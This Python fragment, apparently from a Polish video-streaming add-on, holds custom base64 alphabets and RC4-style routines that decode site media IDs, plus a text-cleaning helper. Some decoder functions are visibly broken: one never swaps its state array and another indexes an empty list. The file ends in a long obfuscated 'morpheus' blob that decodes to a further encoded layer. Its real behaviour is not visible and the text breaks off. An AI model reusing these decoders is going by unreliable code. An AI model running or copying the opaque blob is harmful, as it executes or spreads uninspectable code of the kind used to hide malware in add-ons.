    STANDARD_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    #CUSTOM_ALPHABET =   "5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"   #23/05/22
    CUSTOM_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'#'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='

    ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = string.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)
except:
    STANDARD_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    #CUSTOM_ALPHABET =   b"5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"  #23/05/22
    CUSTOM_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'#'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='
    
    
    ENCODE_TRANS = bytes.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = bytes.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)

    
    
    
def encode2(input):
    return base64.b64encode(input).translate(ENCODE_TRANS)
def decode2(input):
    try:    
        xx= input.translate(DECODE_TRANS)
    except:
        xx= str(input).translate(DECODE_TRANS)
    return base64.b64decode(xx)

def vidcloud_deco(media_id):
    try:
        import string
     #   STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
     #   CUSTOM_ALPHABETx =   '0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG='  #23/05/22
        CUSTOM_ALPHABETx =   "51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
    
        ENCODE_TRANSx = string.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = string.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    except:
       # STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
        STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
      #  CUSTOM_ALPHABETx =   b'0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG=' #23/05/22
        CUSTOM_ALPHABETx =   b"51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
        
        
        ENCODE_TRANSx = bytes.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = bytes.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    
        
        
        
    def encode2x(input):
        return base64.b64encode(input).translate(ENCODE_TRANSx)
    def decode2x(input):
        try:    
            xx= input.translate(DECODE_TRANSx)
        except:
            xx= str(input).translate(DECODE_TRANSx)
        return base64.b64decode(xx)
    
    
    

    try:
        media_id = encode2x(media_id)
    except:
        media_id = encode2x(media_id.encode('utf-8')).decode('utf-8')
   # seed = 'LCbu3iYC7ln24K7P'  #23/05/22
    seed = 'dOuhV3IsSvf7jeI5' #28/05/22
    
    
    
    
    
    
    #
    array_list = list(range(0, 256))
    
    j = 0;
    
    pix_color = "";
    
    length = 256;
    
    i = 0;
    for i in range(length):
    
        j = (j + array_list[i] + ord(seed[i%len(seed)]))%length
    
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
    j = i = 0;
    
    index = 0;
    for index in range(len(media_id)):
    
        i = (i + index) % length
        j = (j + array_list[i]) % length;
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
        if sys.version_info >= (3,0,0):
            try:
                pix_color += chr((media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
            except:
                pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
        
        else:
            pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )

    if sys.version_info >= (3,0,0):
        pix_color=pix_color.encode('Latin_1')

    pix_color = encode2x(pix_color)

    if sys.version_info >= (3,0,0):
        pix_color = pix_color.decode('utf-8')

    return pix_color;
    
    
#function av(n, t) {
#    var r = _0x450c;
#    for (var i, u = [], e = 0, o = r7, c = 0; c < 256; c++) u[c] = c;
#    for (c = 0; c < 256; c++) e = (e + u[c] + n[K4 + e4 + s4](c % n[ii])) % (256), i = u[c], u[c] = u[e], u[e] = i;
#    for (var c = 0, e = 0, f = 0; p.rdOti(f, t[ii]); f++) e = (e + u[c = p[r(1086) + "Dg"](c, 1) % (256)]) % (256), i = u[c], u[c] = u[e], u[e] = i, o += A3[e5 + qt + e4](t[K4 + e4 + s4](f) ^ u[p.AXpPG(u[c] + u[e], 256)]);
#    return o;
#}
    
def dekodujNowe(t,n): #16.08.21
    #n = encode2(n)
    r=[]
    i=[]
    u=0
    x=''
    c = 256
    for o in range(c):
        i.append(o)
    o=0

    for o in range(c):
        #u = (u + i[o] + t.charCodeAt(o % t.length)) % c
        u = (u + i[o] + ord(t[o%len(t)]))%c
        r = i[o]
        #i[o] = i[u]
        #i[u] = r
    e = 0
    u = 0
    o =0

    for e in range(len(n)):
        u = (u + 1) % 256
        r = i[u]
    
    
    
    
    
    
    #e+=1
        #o = (o + e) % c
        #u = (u + i[o]) % c
        #r = i[o]
        #i[o] = i[u]
        #i[u] = r
    #x += String.fromCharCode(n.charCodeAt(e) ^ i[(i[o] + i[u]) % c])
        if sys.version_info >= (3,0,0):
            try:
                x += chr((n[e])^ i[(i[o] + i[u]) % c] )
            except:
                x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
        else:
            x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
    return x
#
def dekodujNowexxx(t,n):
    r=[]
    i=[]
    o=0
    s=''
    c = 256
    for u in range(256):
        i.append(u)
    for u in range(256):    
        o = (o + r[u] + ord(t[u%len(t)]))%256
        i = r[u]
    e = 0
    u = 0
    o =0
    for e in range(len(n)):
        u = (u + 1) % 256
        i = r[u]
        #s+=
        try:
            s += chr((n[e])^ r[(r[u] + r[o]) % c] )
        except:
            s += chr(ord(n[e])^ r[(r[u] + i[u]) % c] )  
    
    return s
    
    

def dekoduj(r,o):

    t = []
    e = []
    n = 0
    a = ""
    for f in range(256): 
        e.append(f)

    for f in range(256):

        n = (n + e[f] + ord(r[f % len(r)])) % 256
        t = e[f]
        e[f] = e[n]
        e[n] = t

    f = 0
    n = 0
    for h in range(len(o)):
        f = f + 1
        n = (n + e[f % 256]) % 256
        if not f in e:
            f = 0
            t = e[f]
            e[f] = e[n]
            e[n] = t

            a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])
        else:
            t = e[f]
            e[f] = e[n]
            e[n] = t
            if sys.version_info >= (3,0,0):
                #a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])
                
                try:
                    a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])#x += chr((n[e])^ i[(i[o] + i[u]) % c] )
                except:
                    a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])#x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
                
                
                
                
                
                
                
            else:
                a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])

    return a

def PLchar(char):
    if type(char) is not str:
        char=char.encode('utf-8')
    char = char.replace('\\u0105','\xc4\x85').replace('\\u0104','\xc4\x84')
    char = char.replace('\\u0107','\xc4\x87').replace('\\u0106','\xc4\x86')
    char = char.replace('\\u0119','\xc4\x99').replace('\\u0118','\xc4\x98')
    char = char.replace('\\u0142','\xc5\x82').replace('\\u0141','\xc5\x81')
    char = char.replace('\\u0144','\xc5\x84').replace('\\u0144','\xc5\x83')
    char = char.replace('\\u00f3','\xc3\xb3').replace('\\u00d3','\xc3\x93')
    char = char.replace('\\u015b','\xc5\x9b').replace('\\u015a','\xc5\x9a')
    char = char.replace('\\u017a','\xc5\xba').replace('\\u0179','\xc5\xb9')
    char = char.replace('\\u017c','\xc5\xbc').replace('\\u017b','\xc5\xbb')
    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")  
    char = char.replace('&#8230;',"...")    
    char = char.replace("&gt;",">") 
    char = char.replace("&Iacute;","Í").replace("&iacute;","í")
    char = char.replace("&icirc;","î").replace("&Icirc;","Î")
    char = char.replace('&oacute;','ó').replace('&Oacute;','Ó')
    char = char.replace('&quot;','"').replace('&amp;quot;','"')
    char = char.replace('&bdquo;','"').replace('&rdquo;','"')
    char = char.replace("&Scaron;","Š").replace("&scaron;","š")
    char = char.replace("&ndash;","-").replace("&mdash;","-")
    char = char.replace("&Auml;","Ä").replace("&auml;","ä")

    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")  
    char = char.replace('&#8230;',"...")    
    char = char.replace('&#8222;','"').replace('&#8221;','"')   
    char = char.replace('[&hellip;]',"...")
    char = char.replace('&#038;',"&")   
    char = char.replace('&#039;',"'")
    char = char.replace('&quot;','"')
    char = char.replace('&nbsp;',".").replace('&amp;','&')
    
    
    
    char = char.replace('Napisy PL',"[COLOR lightblue](napisy pl)[/COLOR]")
    char = char.replace('Lektor PL',"[COLOR lightblue](lektor pl)[/COLOR]")
    char = char.replace('Dubbing PL',"[COLOR lightblue](dubbing pl)[/COLOR]")   
    return char 

import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDc2NDYzMjUwMzY3MzcxNTc0YzY2NjkyYjcwNjYzMDY2NmE2ZTUxNjY2NDcwNTY3NTcxNjU1NTUwNTc0ODY1NmMzMTRlNTc1MzU3NTQ1YTMyNDc0NTY1NzkyZjQxNDc2YjcyNTg2ZjQyNDY2YjZkNDM0ZDY0NjgzNTZiNzM1NDMyNzIzNzM5NmE3YTRkNjkzOTU0MzUzMzcxMzY2YzU5MmYzOTQ1NGY0YjQyNjI2MjQ0NGQyYjYyNDg2ZDQ4NGU0NzZhNDY2YTJmMzQzMjJiNDgzNjJmMzczMjM2MmY0NDcyNjIzNzc2NjgzOTM5MmYyYjc4MzkyZjZkNTI2NjZhMzc2MjM3MmYyZjY0NmQ3MjYxMzIyZjc2NDgzMzMzNjI2Mjc2NzgyYjJiNTQ2NjM3NzQ2MjM3Nzg2YTJmMmY2NjY2NjYzMjc0NzUzNzJiMzM2MjM0NjYzNzMzNzYyZjMzMzczMzJmMzU1MTc3MmI3OTc5NjEzNTM0MmY3MTMzNDI2NDcxN2E0MzY1MmI3NTZlNzQ3MjQ5NGE3MTZjNTQzMjczNjg1YTJiMzIzNzY1MzU2YzM5NzI2ZDJmNzA3MzY1Nzk2ZDU5Mzk1NjU1NTY3MjRhNmEzOTZkMzM1ODU4NjczNTM0NjY0ZjM4NjMzNzRhNGMzNjY1NzEyZjM0Mzc2YzMyNjgyYjc1NmM2MzMyNmU3ODdhNGQ2NjRmNmE1MjJmNjI2MzQ3MzM3NjQyMmIzOTRhMmY2NDY3Mzc3YTMwNTgzMjM5NmE3YTU3Mzc3MjRlNjYzMjZlNzIzMDZlNDg0YzYzNGYzMzcwNGQ1MjMxMzI1NTMwMmI2NDdhNGQ0NDM2NTA0YjMwNzU1MDcwNjE1ODUwNjM2NjUwNzM0MjJiNTA1MzdhMzkzNzMwNTc0ZjRmMzMzNzUwNTEzODcxNmM0ODM3MzY2NjUzMzU1NzQ2NmM0YzUwMzc1NzY1NTIzODM5NjE0NjY4NzA2YTcwNTkzNDJiMzc3OTY2NTA1OTJiNDEzODZhMzI2ZTUwMzMzNjc0N2E2NDY0NjE0ZTczNzM3MjdhNzk2ZTZjMzI0MTc1NzUzNTcxNDUzNjM0N2EzODYxN2E0MTM5MzU2ODZjNzc1ODQ4NmI1NzY2NzQzNTMzNTA3NDM0NDQzMDU5MzMzODUwMzM3MjRkNjIzOTJiNGIzNTM3MzM1YTUzNTE1NDY0NzY1MDZhNTIzNjY2NjY2NTMwMzg0ZTM2NTczNzRjNTA1OTMyMzU0ODQxNjgzNzMwNTI0NDM5NzU2NDdhMzE1NDc5NjY2YTM0MzQ3NTU1NzY2NjM1N2E1MDZjNjgzMzQ0NTAyZjZlNTU0OTY1NTA0ODY1NzU0YzY5NDk0ODM1NzY1MjM4NGM3MDMyNzkzMjRkNzM2ZTM1NGEzNDJiNmEzNjU3NGUzOTMyNDI3NTRlNjU1MTcwMzg2NTc4Nzg3MDQ2MzY2NTRiNTQ1MDZlNTAzNjM0NzczMzM5NTg2YjRmNTY3NzRlNDY1ODM3NDQ0ZjUwNmE0NTJiMzU3NTU2NTU3ODU1NTk2NDM4NTQzOTY4NjUzNjY2N2EzMzZhNTA3NTRjNjM2ODRjMzYzNzZhNzU1MjQyMzY1MDRkNjU2ZTM1Mzg0YjQ0NDI0ZTcyNDMzODM3NjIzMjQ5NTY3NTZmNDk1MTY2NzU0ODM0MmIzMjM2NDI2NjU4NmUzODY0NjY2MjM1NDM1YTM0MzA0ZTY1MzI0NzQ3NzM0YzY4Njk0YzY0NmU2YTY3NTA2NjY5NGQ0ZDU4NzUzODc1MzQ2ODUwNWE3Njc3NTU3NjMwNDc2NjQ5MmY1MjM5NTg2YjQ1NTg0NzRiMzgzNDUxNjgzNzQ5MzA0ZDQxMmIzNDc4Mzc2NjYxMzk2NzU3MzQ3YTU1NDIzNTczNjI2NjM4NjQ2MTQzNTkzMzcxMzQ2YTMzNjE3MjQ5NTU2NTQ3NjM1MjU2MmY2NjdhNzc1ODc0NDM3Njc1NjM3NzQ5NTg2NDZhNzA1NDQ0NzQ2NzU4Mzg3MTM2NGQ2NjczNjM1NTY0NmY1MzM4MzUzOTUzNzEyZjQyNTg2ZTY5NTY0NjU4NGM3NjUxNDg0ZjM4NDg0ZjM0Nzg0ODMzNzI1NDQyNzU0MTQ4MzM3OTQ3NzQzNzZjNWEzMjY2NmY2MzY5NmE1MDMyNWE2NjJiMzAzNjZlNDk1NTcwNTIzODMzNmY2MjJiNjUzOTdhNmU1MTc1Mzk1NDMyNzA2ZTMyNjg1MjM5NjE1NjVhNDY2NDQ5NDQ2NDJiNzgyZjc1NjEzMTRkNDYzODU4NTQ3YTQ4NjEzNTY5NzY2NzZjMzc2ODQ4Mzc1MTU2Mzk1NjUwNTU3Mjc2NDU0MjMyNTAzOTRkNjU1MjU4Mzk1YTRkNDQzNzU4NTA2NzZhMzM2NzU3MzU0MzJiNjc0MjMxNzk3MjQ5Nzc3NTc1Nzc0YTJiNzc1Mjc3NDkzODc3NjYzOTdhMzMzNzRiMzk2MzMyNmUzOTRhMmY3OTcwNTc0OTJmN2E0YzQ1NmUzMjUwMzE0NTc0NGUyZjY0NzAzNDQ0NmU0YzQxNjIyYjQzMzM2ZjZlNGQ2YTc4Nzc2ZTJiNTI3NjMzMzE3YTc5NDYzOTY4N2E0OTQ3MmI0YzM1MmI2ZjdhMmY1NDY4N2E0Mzc1N2E0NjY2Mzg2OTZlNGE3MzQxNzU2OTUyMmY2ZjM0MzUyYjYyNDE3NDM1NmQ2ZTM4NGM0ODU4NGI0ZDM5MmY2ZTMwNjEzNTM0NTY3MzQ2NjYyYjRjNzk0MzUwNzE3MTYxNjU2OTZkNzAzMDM3NDQ0NTRmNTA0MTcyNTgzMDUwNmQ0NjY2Nzg1ODc3NTMyZjMyNTUzNTZjMzM3MzYzNjQ1OTRhNjU1MzZlN2EyZjQxNTAzMzJmMzA2YTM3NGM2YzZlNjY0ZTQ2NzY2NTczNzA2NTMwNzUzODM1MmY2ODZlNzg0NzQzNGE2NTcxNjI2NTUyNjY2NzZjMzc0ZTY2NmY3Njc2NTM3YTM5MzE1OTQ0MzU3NzQ4MzczMDUyMzAzMjYzNzM0MjZkNjY3MDYyN2E2ZTYxNTA3OTYxMzcyYjQ4MzczNDQzNzY3NzcxNzk2ZTM5NTE0ODRmNjU0OTY1NTM0NzQ4N2E3YTM3Mzk1NzY4Njk2ZTc2Mzc0Mjc1NDQ3NDY5NDg0ZjY3NTAyZjZmNTA3ODYzNjYyYjRiNjY2YTU5NTI3NjM0NGYyZjYxNGY0YTUzNmI2NjQ5MzY3NjZmNzQ2NDRmNTIyYjJiNDQyZjYyNGM0NzZhNGQ3NjMyNDY0ODc3Njg1MDM2MzQ3NzZlNzQ2NzRlMzg1MTU0NTk3NjQxNDI1MDU3NDYyYjZhNDM2NjRmNGYzNjU4Mzg2NjRmMzY0ZDYxMzU1NDRjMzQ0OTY0NjY0MTYzMzg1NTM1NGQ0MzM4Nzc3NDRjNDk2NTYxNTk2NTQ3NTc2NjMwNjMyZjZmNTY1YTZjNjQ1NTQ3NDk2Mzc5NDk0NjM1NDU0NjczNjc1NjYzNmE3YTY5NmQ0ZjRhMzg2OTU0NDg1MTQ5MmIzMTQxNTA1NDQ3NjU1NTMzNzg0MzdhNzk0Njc4NDIzMzM2NGQzOTc5Mzc3ODQ3MmI1MzQ1MzM0ZTUyMzMzNjUxNmYzMjRkNTE1OTM1MzczNTQ1NTk1NDQ0MmI2YzQ0MzE0YTY2Mzg0MTJmNjk0MTY1MzY0NDQyNGMzMzQyNGE1MTMyMmY1NDYzMzM2ZTZkNTgzNjJmNGE3OTM3Njk3NjU5Njk0NDYzNzc2ZTM4NTg1NDQ4NTc1MjJmNDg0YzU0NTM0NDc4Njc1ODZiNTE0MzMzNzU2YTcwMzc0YzQ4MzczNzUxMzMzNzZmNjM3NjZlMmI0NTc2Nzc0MzJmNDU0YTY2NTI1YTU3NzU0OTUwNTA3NTRkNTQyZjY5NjUyYjY4N2E3ODQxNDg0NTVhMzg1MTU1MmIzMjRjNzY0MTRkMmY0ZjMxNWEyZjQxNjM1OTRmNzM0YjJmNDMzNDU2MzQ2NzY2MzQ2MTU5NmM0NjRiNjU2MTQyNTgzMzQ1NGYzODM4Njg2ZTZjNjk2ZTY5NGI2NTUxNjI0NzQ0Nzc1NzdhNmI1NTYzNjE2ZDYxMzk0Njc1MzU1MzU1NTIyZjc5NGQ0ZjQ5NWE1MDRkMzAyYjM4NDgyYjRkMzM0YjJiNDk0MTM5NTE1NjM5NmQ2YTdhNzc1NDQ4NzczODQ1MmY2Mzc4NGMzNDc3NDI0ODQ4NDk2YzcyNmI2MjM2NGMyZjU2NTM3NzU4MzQ2NTM0MzIzMzc5NDQyZjc2NTg2ZjM4NTE0ODM1MzQ0ZTM1MzQ1NDcyNmM0NzZmNzk2NjMwNjkyZjUzNzIzMTY4NDg3NjUwNzE1OTUzNzc2NzJmMzUyZjc2NTA2ZTQxMmY3MzU2Njg3OTY4NmM3ODU4Nzk3YTQyNDg3ODc5NmE3YTZmNTE1ODM5Mzg2MjZiMmIzODQyNTQzNDcyNDMzMzZjNmU3Nzc1NjU3MjRkMmI0ZjZkNzA0ODM4MmY1NDQ4MzY1MjJmNGQ0ZTM4NjE0ZTQ4MmI2ZDc2NTk3NjUwNTA2ZjQ4MmY2YjMyNWEzNjU5NjQ0ODM0NjgzOTc4NmQ1NjY3MzE2OTc2MzQ0YjU0NjQzODc3NjU1MTYyMmI3MzQzNTQ1NzMwNTczOTM4MzY0ZTM0NmU3NjY3NDM2NjdhMzg1Mjc2MzY3MDRjMmI0MTZlMzMzNDc2NDI2MzM0NTg2NTQyMzMzNjY3NzYzNjY4MzAzNjY3NzI3NzQzMzQ1MzUwN2E1NzQyNjc2NTcwNTgzNTJmNzg3MDMwNjI1MjRlMzM0NzcxNDk0NzM1NGM0ODQ1N2E0NTcyNjc1ODczMzM2OTZhMzg1NDcyNmI1MTRkMzg1MTdhNDgyZjQ1NGM0ODQ3NGI2NTZmNDc3YTQ1NDc2NTcxNDk2YzZhNjI3OTYxNDk0ZDc2NzE0MTZiNzE1ODc0NzM0NTMxNDEzOTZhNmU3NjZjMzIzNDRhN2EzMDUzNDQ3NzQ4MzM2YTRjNzU2NzQxNjU2YzM2NGQ1MzdhNzg0YjJiNDI0ODM2NTg1NTQ4Mzg1MjY4NmQ1MjY2MzA3YTY2Nzc0YjU4MzU0ODM0NTkzMTM1NjI1NTUzMzg0NzMxMzU3NTUzMzgzODU0Mzg0ZjQ3MmY0MjU4NzU3MDQ4MzY2ODZhNjc1NjMwMzI3MzUxNTI1OTc5Mzk1MTQyNmE1NjMyNzc3MzM4NTE1MzVhNDc1YTJiNzM1NjM2NDI1MDMxNjg2NTM4NTIyZjQxNTA3NTQ1NzI1YTY1NTIzMTdhMzEzNDc4NWE0YTc4Njc0NjVhMzI0NjZlNmY3NzJmNTAzNTUwNDU0NzYzNjM0NzM4NDE0YzJmNDMzOTc5NmU2NjY3NjY2NzJmNjM1NDM0NTk2OTMzNjc0MTc1MzI0ODY1N2E1OTcyNzk0ZDU1NjY2ODY2NzU2OTUwNjQ2NDU4NDkyYjM1NjgyZjcwNDMzNDVhNTI1MjJmNzc0NTYzMzM1OTUwNzQ1MDMyNzg1MDYyNDE3ODQzNjY2ZDZhNjY2NzY3NzI3MzQ5MmIzMTRjNzU0MzU4Mzc0NjRmMzQ1MDdhNjg1NDc4NjkzMzRjNDM1NDc1NGQ0NDJmNGQ0ZjdhNTQzNTQ2NmE2NzRmNGY1YTQ2MzMzNjQyMmY0NTUzNjY2NzQ2Nzg3NTM2NWE3ODM0NjczMTZhNDU2NjY3NDk2NTRlNzc1YTQ0MzA2ZjY1NTE2MjJiNTI2Mjc0NGM3NjY0NjU3NzQyNzA0YjM0MzUyYjM5Mzg1NDc2NTI3NDM3NmMyZjMxNTU2NzJiNDk2MjdhNDM2NTM2NDIyYjU5NDkyYjMxNjY2ZjRiMzc0MjM4MzgzOTUzNmYzODQyNzU2OTQ1NGU0ZTJmNDk0ZTM4N2E0MTRmNzM2ZTJiNDQyZjQxMzI3NTQ4MzU1NjY1MmI2Nzc2MzU3MDRmMzk2OTRlMmI0YTRiNzk3MDc1NDIzMTJiNGE0NzZkNTA0ZDU0NTg0MzY1MzA3NTY0NjE1MDU1NTk2MzQyNDg3MTU1MmI0ZTQ4NzY1MzVhMmI0YjU4Njg0ZTM3NDI2NjQ5Mzc2YTRkMmI3MDQ0MzY0ZjUyNGY1ODUzNzY3MjMzNmQ2NjZiNTY0ZDc2NmM0ODM2NDY2NDc5NzU3OTc2MzE2ODQ4Mzk2YjQ4NTQ2ZjUyNjY0MzU5NGY1MTYzMmI3Mzc0Nzg0MTMzNzc0YTJmMzA0MzMyMzk1YTcyMzI3MjU5NDUyZjRiNTA3YTRiNGY1NTUxMzk0ZjJmNzI1NzY1Nzg0ODJiNzU0MTZjNTA2ODRjNmU0NDRjMzU1MzY1NmY0OTMxNGI0NTZhMzU2MzRhMzEzMDUxMmYzODZlNTg1NzU0MmI0NjY3NDEzMzUxNGE3NjQ3NTkyYjczNjkzODJiMzA0YTJmNTg0ODY1NzI0NjcxNTQ0ODMxNDY2ZTQxMzQ2YjdhNmY2YTcyNTMzODYxMzM1NDJmNzU3ODc2NmQ0ZTY0NDI3Njc3NTI1MDRlNzQyZjMyNTUzMzcxNTIzOTU0NmM3OTQ0MzI2ODM0NzY3YTc3NjY3MzZlNTQ3YTRiNGY3MzU5MzY3Nzc2NTA3ODY3MzQ0Yzc0MzY0NDc1NDk1NjY2MzA3OTM4NzA2YjJmNmE1ODUzNzU3YTQ0NzU2YjQ2MmY3YTVhNzYyYjRiNzY0NTZkMmI1MjM5MmI3OTc0Nzg0OTY2NDc0MjM5NTc1OTZhNjQ2MzUzMmY2NjRhMzc2ZTQ2NmM2MjJiNTEyYjUyNDQzMjQ2N2E3YTYyNGQ3ODJiNzc0NDc1MzA1YTYyMmY0NDZlNzc2NTUxNzY3ODY4MzM3NDY4MzM3ODQ2NzY2MjQ1NGY0ZjU1NzM2NDMwNjg0NDY2NDI0ZjM5NDczMTczMzM0ZDQ5MmY1MTcyMmI2ODQ4MzAzNDZiNzM2NDYyNDg0MTU2MmI1MjQ2MzEzNjMxNTQ2OTZjMmIzOTQ0NzY1NjZmNzk1ODc5NDY2NjczNmUzNDY5NzI2YjY4NzU2YjRhNzc0YzY2NGI0ZjUwNTMzNDJiNjc2ZjRiNjU0ZDY1NDU1MjM4NDE3MjM0NTM3NDMyNDE0ODM2NmM2ZTc3NmE0NjY4NGM2NjQzNjE2NTQ1MzcyZjZmNjgzMTcyNzE2ZDM1NGMzOTZiMzgyYjM2NjczMzQ4NDc3NTcwNzIzMTY2NTc3Mjc5NmI1NTJiNjM0OTQ3MzQ2ODc0Njc3MjMyNTY2MTY4MzU3MDRjMzQyYjc3NmQzOTUxNTQzNzQ0NzU3MDc3MzY1YTRhMzY1NDRmNTk0YzMxNGQ1ODQ1NGE2NTQ5NTczNzM1NDg0YTJmMzE0OTU3NzY0NzZjNTAzNzQzNTA0OTRhMmY2NTM2MzczNDZlMzk1MzMxNzI0MTY0NDYzMzc4NDk2ZTM3NDk2NTZmNTgzNjZkNGM1NzYxMzg1ODZmNmE2NDU4Mzc0OTZmNjE1MjU0NGY3NjZhNGY0YTMzMzk0NTc2MzQ0ZTY1Nzc1YTQ1NmM0ZTVhNzYyYjMxNzQzNDMxNjMzMTM2MmY0NTQ4MzU2YTM5NDk3Njc5NWEzMTQ0NGY3ODY0NTM0NjMwMmI0MzUwNTk1NjcyNGE2NTU1Mzg1OTRmNDczOTU5NTg1NTUxNjQ0MTdhMzU3MzU4NjM3YTMzNjc3NTM0NDI2NDZlMzY0MzY0NmI1ODYzNzU2NTZhNTgzMjZkNzA2ODM4N2E2YTMyNDUzODM1Njk3NjY5NjQ2NjQ0NmM2NDJmNTIyZjYyNTU2ZTM4MmI0ZDUxNmEzNTY5MmY2OTRhNzY0Njc3NGMyZjRmNTQ0ZjZiMzM3OTQ0NmUzMjRjNjU1OTRjNzg3NDZhNDkzNjUxNzQzNTQ1NzY3MDY3NjE1ODQzNTQ3NTQ1NDY2NjY3NzQyYjc4NDI3ODQ5MmI2YzcyN2E0YzMxNDg0Zjc2NTk2NzZlNmI0YTM5MmY3NjQxNTYyYjcwNDIzNjZlNTQ2ZDVhNjU1MzRjNTE3NTZmNDQzNjQxNzAzNTY4NTg2YTQ2Mzg1MTcyNTAyYjY2NDk0ODMxNDgzMzRkMzgzNTcwNzg1NDU3Nzc2YTdhNzQ1ODUzNTA3OTRhNjY1MDZhNTAyZjQzMzgzNjZkNDI2ZTY0NDY3NjM3NDg2ZjU2NjM3NDM3NjE0MjJmNjk0NTc2MzI1NDY2NTE3MjdhNGM2NTczNGIzMTQ4MzI2MzU0Nzk0Njc5NTQzNjU0NTA1YTU2MzY0NDQ4MzE1NzM4NmUzMzZlNTg2YzM3NmM2MTU1NzA2NTQ1Nzg0NDRjNzE2NzY2NmQzNzRhNGYzNjdhNzIzMjRhMzk3NzU0MzUzNjUzNmEzOTY4N2E2MzZjMmI2NzQ4NTUzODJmNjczMDJmNTE0YzMxNDM2NTc4NTE2MzY4MzczNjc5MzY2NzU2MzM0NzU2NjUyYjc4NGU1ODQ1Mzk0YTM4Njk3MDM2NmQ2ZTZlNDk0MzM0NGQ3MDY5MmI2YTU4MzczNzQ2NjQ2NTZkNDI3YTRhMzI0NzZjNGY0YTU5MzU1MDY2NTc0MTJiNzkzNzc2NTI1OTU4Mzk2NTRkNTAzODZhMzA0ZDUwNTU0YTM1Nzc0NzM4MzU2NjdhNTk0MjM0Nzc2ZDcyNzA1YTY5N2EzMDQyNzczMDM5NTI0Njc0NGQ3Njc4NDMzNzY0NDU0NDMxMzk3ODU1NzI0YjRmNDg2MzU1NTg0YTYzMzc1OTU2Mzc1MDY2NWE1YTMzNDEzMzZkNDEyZjc3NTgzMjQ5NWEyZjU5MzU2ZTQzMmYzNzQ2NmYzODM0NTE0Yjc4NDU0ODRhNjI1Mzc2MzU1ODczNTU3ODY3NjI1MDc2Nzc2MzJmNmM0Yzc4NjY3NDVhNGMzMDZiNjY3NjcxNTE2NjMyMzkzNTY3MzMyYjM1NDEzOTJiMzEzMjM4NGEzNTQzMzY2Yzc2NDY1NjY5NzYzODc5NzI3NDZlNjYzNDMxMzY3MDYxNTY1OTQ3NGMzMDRiNGE3OTM3NTA3MDVhMmI2ZTU0NmU2OTUwMzE3OTY5NjgzMTM2NDM2OTMxNGE2NTY2NDI0ZjZmNDQ1MDczMmIzNjUyMmY0NjY4NGI1MDM4MzQ2NTc3NGU1MTQ4NzI0MjY0Njc0ZTM2MzQ1ODQ1NDUzODUyNGEzMDc2NmQ1ODM'
